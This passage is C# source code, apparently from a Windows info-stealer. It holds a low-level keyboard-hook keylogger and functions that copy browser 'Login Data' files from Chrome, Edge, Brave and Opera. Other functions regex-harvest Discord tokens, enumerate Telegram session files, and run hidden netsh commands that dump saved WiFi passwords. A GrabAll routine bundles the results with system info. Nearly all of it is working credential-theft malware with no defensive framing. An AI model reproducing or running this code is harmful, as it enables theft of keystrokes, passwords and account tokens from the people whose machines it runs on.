                        _keylog.Append("[" + ((System.Windows.Forms.Keys)vk).ToString() + "]");
                    }
                    return CallNextHookEx(_hook, n, w, l);
                };
                using (var cp = Process.GetCurrentProcess())
                using (var cm = cp.MainModule) {
                    _hook = SetWindowsHookEx(13, _kbProc, GetModuleHandle(cm.ModuleName), 0);
                }
                KbMsg msg;
                while (_keylogRunning) { GetMessage(out msg, IntPtr.Zero, 0, 0); TranslateMessage(ref msg); DispatchMessage(ref msg); }
            } catch (Exception ex) { Log("Keylogger error: " + ex.Message); }
            finally { if (_hook != IntPtr.Zero) { UnhookWindowsHookEx(_hook); _hook = IntPtr.Zero; } _keylogRunning = false; }
        }

        static string GrabBrowsers() {
            var sb = new StringBuilder("=== BROWSERS ===\n");
            string lc = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            string rm = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string[] paths = {
                System.IO.Path.Combine(lc,"Google","Chrome","User Data","Default","Login Data"),
                System.IO.Path.Combine(lc,"Microsoft","Edge","User Data","Default","Login Data"),
                System.IO.Path.Combine(lc,"BraveSoftware","Brave-Browser","User Data","Default","Login Data"),
                System.IO.Path.Combine(rm,"Opera Software","Opera Stable","Login Data"),
            };
            foreach (var path in paths) {
                if (!File.Exists(path)) continue;
                try {
                    string tmp = System.IO.Path.GetTempFileName(); File.Copy(path, tmp, true);
                    string raw = Encoding.UTF8.GetString(File.ReadAllBytes(tmp)).Replace("\0"," ");
                    int idx2=0, cnt=0;
                    while ((idx2=raw.IndexOf("http",idx2))!=-1 && cnt<30) { int e=raw.IndexOf(' ',idx2); if(e==-1||e-idx2>200){idx2++;continue;} sb.AppendLine(raw.Substring(idx2,e-idx2)); cnt++; idx2=e; }
                    File.Delete(tmp);
                } catch {}
            }
            return sb.ToString();
        }

        static string GrabDiscord() {
            var sb = new StringBuilder("=== DISCORD ===\n");
            string rm = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            foreach (var app in new[]{"discord","discordcanary","discordptb"}) {
                string p2 = System.IO.Path.Combine(rm, app, "Local Storage", "leveldb");
                if (!Directory.Exists(p2)) continue;
                foreach (var f in Directory.GetFiles(p2, "*.ldb"))
                    try {
                        foreach (System.Text.RegularExpressions.Match m in System.Text.RegularExpressions.Regex.Matches(File.ReadAllText(f, Encoding.UTF8), @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}"))
                            sb.AppendLine("[TOKEN] "+m.Value);
                    } catch {}
            }
            return sb.Length > 20 ? sb.ToString() : "No Discord tokens found";
        }

        static string GrabTelegram() {
            string p2 = System.IO.Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Telegram Desktop", "tdata");
            if (!Directory.Exists(p2)) return "Telegram not found";
            var sb = new StringBuilder("tdata: " + p2 + "\n");
            foreach (var f in Directory.GetFiles(p2)) sb.AppendLine(System.IO.Path.GetFileName(f) + " " + new FileInfo(f).Length + "b");
            return sb.ToString();
        }

        static string GrabWifi() {
            try {
                var p2 = new Process { StartInfo = new ProcessStartInfo { FileName="cmd.exe", Arguments="/c netsh wlan show profiles", UseShellExecute=false, RedirectStandardOutput=true, CreateNoWindow=true } };
                p2.Start(); var sb = new StringBuilder();
                foreach (var line in p2.StandardOutput.ReadToEnd().Split(new char[] { '\n' })) {
                    if (!line.Contains(":")) continue;
                    string name = line.Split(new char[] { ':' })[1].Trim(); if (string.IsNullOrEmpty(name)) continue;
                    try {
                        var p3 = new Process { StartInfo = new ProcessStartInfo { FileName="cmd.exe", Arguments="/c netsh wlan show profile \""+name+"\" key=clear", UseShellExecute=false, RedirectStandardOutput=true, CreateNoWindow=true } };
                        p3.Start();
                        foreach (var dl in p3.StandardOutput.ReadToEnd().Split(new char[] { '\n' }))
                            if (dl.Contains("Key Content") || dl.Contains("Содержимое ключа")) { sb.AppendLine(name+" : "+dl.Split(new char[] { ':' })[1].Trim()); break; }
                    } catch {}
                }
                return sb.Length > 0 ? sb.ToString() : "No WiFi passwords";
            } catch (Exception ex) { return "wifi error: "+ex.Message; }
        }

        static string GrabAll() {
            return "=== FULL GRAB ===\n\n[BROWSERS]\n" + GrabBrowsers() +
                   "\n[DISCORD]\n" + GrabDiscord() +
                   "\n[WIFI]\n"    + GrabWifi()    +
                   "\n[SYSTEM]\n"  + GetSysInfo();
        }

    }
}
`
